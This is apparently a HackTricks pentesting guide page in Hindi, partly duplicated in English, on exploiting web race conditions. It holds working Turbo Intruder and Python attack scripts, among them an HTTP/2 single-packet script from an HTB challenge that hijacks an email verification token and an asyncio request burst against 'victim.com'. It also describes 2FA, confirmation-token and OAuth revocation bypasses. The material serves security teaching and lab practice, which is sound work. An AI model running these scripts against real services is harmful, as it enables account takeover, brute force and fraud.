# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> इस तकनीक की गहरी समझ प्राप्त करने के लिए मूल रिपोर्ट देखें [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Race Condition हमलों को बेहतर बनाना

मुख्य बाधा यह सुनिश्चित करना है कि एक साथ कई requests को लगभग एक साथ हैंडल किया जाए, उनके प्रोसेसिंग समय में **बहुत कम अंतर — आदर्श रूप में, 1ms से कम**।

यहाँ अनुरोधों को समकालिक करने के लिए कुछ तकनीकें दी गई हैं:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: एक ही TCP कनेक्शन पर दो requests भेजने का समर्थन करता है, जिससे network jitter का प्रभाव कम होता है। हालांकि, server-side विविधताओं के कारण, दो requests एक स्थिर race condition exploit के लिए हमेशा पर्याप्त नहीं होते।
- **HTTP/1.1 'Last-Byte Sync'**: 20-30 requests के अधिकांश हिस्सों को पहले से भेजने में सक्षम बनाता है, एक छोटा fragment रोक कर रखा जाता है, जिसे बाद में साथ भेजा जाता है, जिससे सर्वर पर एक साथ पहुंच सुनिश्चित होती है।

**Preparation for Last-Byte Sync** में शामिल हैं:

1. headers और body डेटा भेजना, अंतिम बाइट छोड़कर, stream को बंद किए बिना।
2. प्रारंभिक भेजने के बाद 100ms के लिए रोकना।
3. TCP_NODELAY को disable करना ताकि Nagle's algorithm final frames को batch कर सके।
4. कनेक्शन warm up करने के लिए ping करना।

रोक कर रखे गए frames को बाद में भेजने से वे एक single packet में पहुँचने चाहिए, जिसे Wireshark से सत्यापित किया जा सकता है। यह तरीका static files पर लागू नहीं होता, जो सामान्यतः RC attacks में शामिल नहीं होते।

### Server Architecture के अनुसार अनुकूलन

लक्ष्य की architecture को समझना बेहद महत्वपूर्ण है। Front-end servers अनुरोधों को अलग तरह से route कर सकते हैं, जो timing को प्रभावित करता है। बेबाक/अहमियतहीन अनुरोधों के माध्यम से server-side connection warming पहले से करने से request timing सामान्य हो सकती है।

#### Session-Based Locking को हैंडल करना

PHP जैसे frameworks का session handler session के हिसाब से requests को serialize करते हैं, जो संभावित vulnerabilities को छुपा सकते हैं। प्रत्येक request के लिए अलग session tokens का उपयोग इस समस्या को पार कर सकता है।

#### Rate या Resource Limits को पार करना

यदि connection warming प्रभावी नहीं है, तो dummy requests की बाढ़ के जरिए web servers के rate या resource limit delays को जानबूझकर ट्रिगर करने से server-side delay पैदा हो सकता है जो race conditions के अनुकूल होकर single-packet attack को आसान बना सकता है।

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: आप request को **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`) में भेज सकते हैं, request में उस value को बदल सकते हैं जिसे आप brute force करना चाहते हैं — उदाहरण के लिए **`%s`** जैसा `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` — और फिर ड्रॉपडाउन से **`examples/race-single-packer-attack.py`** चुनें:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

अगर आप **send different values** करने जा रहे हैं, तो आप कोड को इस तरह बदल सकते हैं जो clipboard से wordlist का उपयोग करता है:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> अगर वेब HTTP2 का समर्थन नहीं करता (केवल HTTP1.1), तो `Engine.THREADED` या `Engine.BURP` का उपयोग `Engine.BURP2` के बजाय करें.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: अगर आपको 1 endpoint पर एक request भेजनी है और फिर RCE trigger करने के लिए अन्य endpoints पर कई request भेजनी हों, तो आप `race-single-packet-attack.py` script को कुछ इस तरह बदल सकते हैं:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- यह भी **Repeater** में उपलब्ध है, Burp Suite के नए '**Send group in parallel**' विकल्प के माध्यम से।
- **limit-overrun** के लिए आप समूह में बस **उसी request को 50 बार** जोड़ सकते हैं।
- **connection warming** के लिए, आप **group** की **beginning** पर वेब सर्वर के किसी non static हिस्से के लिए कुछ **requests** जोड़ सकते हैं।
- 2 substates steps में एक request से दूसरे request को प्रोसेस करने के बीच प्रक्रिया को **delaying** करने के लिए, आप दोनों requests के बीच अतिरिक्त requests जोड़ सकते हैं।
- एक **multi-endpoint** RC के लिए आप वह **request** भेजना शुरू कर सकते हैं जो **hidden state** में जाता है और उसके ठीक बाद उस hidden state का **exploit** करने के लिए **50 requests** भेजें।

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: इस script का उद्देश्य एक user का email बदलना है और इसे लगातार verify करते रहना जब तक नए email का verification token आखिरी email पर न पहुँच जाए (यह इसलिए था क्योंकि code में एक RC देखा गया था जहाँ email modify किया जा सकता था पर verification पुरानी email पर भेज दी जाती थी क्योंकि email बताने वाला variable पहले वाले से ही populated था).\
जब प्राप्त ईमेलों में शब्द "objetivo" मिलता है तो हमें पता चलता है कि हमने बदले हुए email का verification token प्राप्त कर लिया है और हम attack समाप्त कर देते हैं।
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: इंजन और गेटिंग नोट्स

- Engine चयन: HTTP/2 लक्ष्यों पर `Engine.BURP2` उपयोग करें ताकि single‑packet attack ट्रिगर हो; HTTP/1.1 last‑byte sync के लिए `Engine.THREADED` या `Engine.BURP` पर वापस जाएँ।
- `gate`/`openGate`: कई कॉपीज़ `gate='race1'` (या per‑attempt gates) के साथ queue करें, जो प्रत्येक request की tail रोकता है; `openGate('race1')` सभी tails को एक साथ flush करता है ताकि वे लगभग एक साथ पहुँचें।
- Diagnostics: Turbo Intruder में negative timestamps दर्शाते हैं कि server ने response भेज दिया request पूरी तरह भेजे जाने से पहले, जो overlap को साबित करता है। यह true races में अपेक्षित है।
- Connection warming: समय निर्धारण स्थिर करने के लिए पहले एक ping या कुछ harmless requests भेजें; वैकल्पिक रूप से अंतिम frames के batching को बढ़ावा देने के लिए `TCP_NODELAY` disable करें।

### Single Packet Attack में सुधार

Original research में बताया गया है कि इस attack की सीमा 1,500 bytes है। हालांकि, [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), में समझाया गया कि कैसे single packet attack की 1,500‑byte सीमितता को IP layer fragmentation का उपयोग करके TCP की **65,535 B window limitation** तक बढ़ाया जा सकता है (एक single packet को कई IP packets में split करना) और उन्हें अलग‑अलग order में भेजना, जिससे packet का reassemble तब तक रोका जा सकता है जब तक सभी fragments सर्वर तक नहीं पहुँच जाते। इस तकनीक से researcher को लगभग 166ms में 10,000 requests भेजने की अनुमति मिली।

Note कि हालांकि यह सुधार उन RC में attack को अधिक विश्वसनीय बनाता है जिनके लिए सैकड़ों/हज़ारों packets को एक ही समय में पहुँचने की आवश्यकता होती है, इसके कुछ software सीमाएँ भी हो सकती हैं। कुछ लोकप्रिय HTTP servers जैसे Apache, Nginx और Go में `SETTINGS_MAX_CONCURRENT_STREAMS` की कड़ाई से सेटिंग होती है — क्रमशः 100, 128 और 250। हालांकि, NodeJS और nghttp2 जैसे अन्य में यह अनलिमिटेड है.\
यह मूलतः मतलब है कि Apache केवल एक single TCP connection से 100 HTTP connections को ही consider करेगा (जो इस RC attack को सीमित करता है)।

You can find some examples using this technique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

पिछले research से पहले, ये कुछ payloads थे जिनका उपयोग केवल packets को RC पैदा करने के लिए यथासंभव तेज़ी से भेजने की कोशिश करने में किया जाता था।

- **Repeater:** पिछले सेक्शन के examples देखें।
- **Intruder**: Intruder को **request** भेजें, **Options menu** के अंदर **number of threads** को **30** पर सेट करें, payload के रूप में **Null payloads** चुनें और **30** generate करें।
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC कार्यप्रणाली**

### Limit-overrun / TOCTOU

यह race condition का सबसे बुनियादी प्रकार है जहाँ ऐसी **vulnerabilities** प्रकट होती हैं जो उन जगहों में होती हैं जहाँ किसी क्रिया को करने की संख्या पर सीमा लगाई जाती है। उदाहरण के लिए किसी ऑनलाइन स्टोर में एक ही discount code को कई बार उपयोग करना। एक बहुत आसान उदाहरण [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) या [**this bug**](https://hackerone.com/reports/759247)**.**

इस तरह के हमलों के कई रूप हैं, जिनमें शामिल हैं:

- एक उपहार कार्ड को कई बार रिडीम करना
- किसी उत्पाद को कई बार रेट करना
- अपने खाते के बैलेंस से अधिक नकद निकालना या ट्रांसफर करना
- एक ही CAPTCHA समाधान को पुनः उपयोग करना
- एक anti-brute-force rate limit को बायपास करना

### **Hidden substates**

Complex race conditions का exploit अक्सर छिपे या **unintended machine substates** के साथ अस्थायी अवसरों का फायदा उठाने में शामिल होता है। इसे करने का तरीका यहाँ है:

1. **Identify Potential Hidden Substates**
- पहले उन endpoints को पहचानें जो critical data को modify या interact करते हैं, जैसे user profiles या password reset प्रक्रियाएँ। ध्यान दें:
- **Storage**: server-side persistent data को manipulate करने वाले endpoints को प्राथमिकता दें बजाय उन endpoints के जो client-side data संभालते हैं।
- **Action**: ऐसे ऑपरेशन्स ढूँढें जो मौजूदा डेटा को alter करते हैं — ये नए डेटा जोड़ने की तुलना में exploitable स्थितियाँ बनाने की अधिक संभावना रखते हैं।
- **Keying**: सफल attacks आमतौर पर एक ही identifier पर keyed operations शामिल करते हैं, जैसे username या reset token।
2. **Conduct Initial Probing**
- पहचाने गए endpoints पर race condition attacks के साथ टेस्ट करें और अपेक्षित परिणामों से किसी भी विचलन का निरीक्षण करें। अप्रत्याशित responses या application व्यवहार में बदलाव एक vulnerability का संकेत हो सकते हैं।
3. **Demonstrate the Vulnerability**
- attack को उन न्यूनतम requests तक संकुचित करें जो vulnerability को exploit करने के लिए आवश्यक हों, अक्सर सिर्फ दो। सटीक timing के कारण यह चरण कई प्रयासों या automation की माँग कर सकता है।

### Time Sensitive Attacks

Requests के timing में सटीकता vulnerabilities को उजागर कर सकती है, खासकर जब security tokens के लिए timestamps जैसे predictable तरीके उपयोग किए जाते हैं। उदाहरण के लिए, यदि password reset tokens timestamps पर आधारित हों तो simultaneous requests के लिए identical tokens बन सकते हैं।

**Exploit करने के लिए:**

- सटीक timing का उपयोग करें, जैसे single packet attack, concurrent password reset requests भेजें। Identical tokens एक vulnerability का संकेत हैं।

**उदाहरण:**

- एक ही समय में दो password reset tokens अनुरोध करें और उनकी तुलना करें। मिलते-जुलते tokens token generation में दोष का संकेत देते हैं।

इसे आज़माने के लिए [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) देखें।

## Hidden substates case studies

### Pay & add an Item

यह देखने के लिए [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) देखें कि कैसे किसी store में **pay** करके और एक अतिरिक्त आइटम **add an extra** कर सकते हैं जिसे आपको **pay नहीं करना पड़ेगा**।

### Confirm other emails

विचार यह है कि एक ही समय पर **एक ईमेल पता verify करें और उसे किसी दूसरे पते में बदल दें** ताकि यह पता चले कि प्लेटफ़ॉर्म नए पते की vérification करता है या नहीं।

### Change email to 2 emails addresses Cookie based

के अनुसार [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab इस तरह takeover के लिए vulnerable था क्योंकि यह संभवतः **send** कर सकता था **the email verification token of one email to the other email**।

इसे आज़माने के लिए [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) देखें।

### Hidden Database states / Confirmation Bypass

यदि **2 different writes** किसी **database** के अंदर **information** जोड़ने के लिए उपयोग की जाती हैं, तो एक छोटा सा समय अंतराल होता है जहाँ database के अंदर **only the first data has been written** होता है। उदाहरण के लिए, user बनाते समय **username** और **password** पहले **written** हो सकते हैं और फिर newly created account को confirm करने के लिए **the token** लिखा जाता है। इसका मतलब है कि एक छोटे समय के लिए **token to confirm an account is null** होता है।

इसलिए, **registering an account and sending several requests with an empty token** (`token=` or `token[]=` or any other variation) तुरंत account confirm करने के लिए भेजना आपको ऐसे account को c**onfirm an account** करने की अनुमति दे सकता है जिसका ईमेल आप नियंत्रित नहीं करते।

इसे आज़माने के लिए [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) देखें।

### Bypass 2FA

नीचे दिया गया pseudo-code race condition के लिए vulnerable है क्योंकि बहुत छोटे समय में session बनते समय **2FA is not enforced** होता है:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 स्थायी पहुँच

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Theses services will allow you to create an application and authenticate users that the provider has registered. In order to do so, the **client** will need to **permit your application** to access some of their data inside of the **OAUth provider**.\  
तो, अब तक यह बस google/linkedin/github... के साथ सामान्य लॉगिन है जहाँ आपको एक पेज दिखाया जाता है जिसमें लिखा होता है: "_Application \<InsertCoolName> आपकी जानकारी तक पहुँचना चाहता है, क्या आप अनुमति देना चाहेंगे?_"


#### Race Condition in `authorization_code`

The **problem** appears when you **accept it** and automatically sends an **`authorization_code`** to the malicious application. Then, this **application abuses a Race Condition in the OAUth service provider to generate more that one AT/RT** (_Authentication Token/Refresh Token_) from the **`authorization_code`** for your account. Basically, it will abuse the fact that you have accept the application to access your data to **create several accounts**. Then, if you **stop allowing the application to access your data one pair of AT/RT will be deleted, but the other ones will still be valid**.

समस्या तब उभरती है जब आप इसे स्वीकार करते हैं और यह स्वतः ही एक **`authorization_code`** दुर्भावनापूर्ण application को भेज देता है। फिर यह application OAUth service provider में एक Race Condition का दुरुपयोग करके आपके खाते के लिए इस **`authorization_code`** से एक से अधिक AT/RT (_Authentication Token/Refresh Token_) उत्पन्न कर देता है। मूल रूप से, यह इस तथ्य का दुरुपयोग करेगा कि आपने application को अपने डेटा तक पहुँच की अनुमति दी थी ताकि यह कई accounts बना सके। फिर, यदि आप application को अपने डेटा तक पहुँच देना रोक देते हैं तो एक जोड़ी AT/RT हटा दी जाएगी, पर बाकी जोड़ी अभी भी मान्य रहेंगी।


#### Race Condition in `Refresh Token`

Once you have **obtained a valid RT** you could try to **abuse it to generate several AT/RT** and **even if the user cancels the permissions** for the malicious application to access his data, **several RTs will still be valid.**

एक बार जब आपने **obtained a valid RT** कर लिया है, तो आप इसे दुरुपयोग करके कई AT/RT उत्पन्न करने की कोशिश कर सकते हैं और यदि उपयोगकर्ता दुर्भावनापूर्ण application के लिए permissions रद्द भी कर देता है, तब भी कई RTs मान्य बने रहेंगे।


## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) you can find a PoC in Java to send websocket messages in **parallel** to abuse **Race Conditions also in Web Sockets**.  
  आप [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) में Java में लिखा PoC पा सकते हैं जो websocket संदेशों को **parallel** में भेजकर Web Sockets में भी Race Conditions का दुरुपयोग करता है।
- With Burp’s WebSocket Turbo Intruder you can use the **THREADED** engine to spawn multiple WS connections and fire payloads in parallel. Start from the official example and tune `config()` (thread count) for concurrency; this is often more reliable than batching on a single connection when racing server‑side state across WS handlers. See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).  
  Burp’s WebSocket Turbo Intruder के साथ आप **THREADED** इंजन का उपयोग करके कई WS कनेक्शन spawn कर सकते हैं और payloads को parallel में भेज सकते हैं। आधिकारिक example से शुरू करें और concurrency के लिए `config()` (thread count) को tune करें; यह अक्सर server‑side state को WS handlers के बीच race करते समय एक ही कनेक्शन पर batching करने से अधिक reliable होता है। See [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).


## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
